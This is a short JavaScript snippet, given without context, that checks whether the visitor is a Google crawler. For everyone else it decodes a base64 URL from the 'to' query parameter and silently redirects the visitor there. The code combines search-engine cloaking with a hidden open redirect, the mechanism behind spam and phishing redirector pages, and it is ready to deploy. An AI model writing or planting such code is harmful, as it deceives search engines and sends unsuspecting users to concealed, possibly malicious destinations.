const ua = navigator.userAgent;
if (!ua.includes('Googlebot') && !ua.includes('Google-InspectionTool')) {
  const params = new URLSearchParams(location.search);
  const target = params.get('to');
  if (target) {
    try {
      window.location.replace(atob(target));
    } catch(e) {}
  }
}
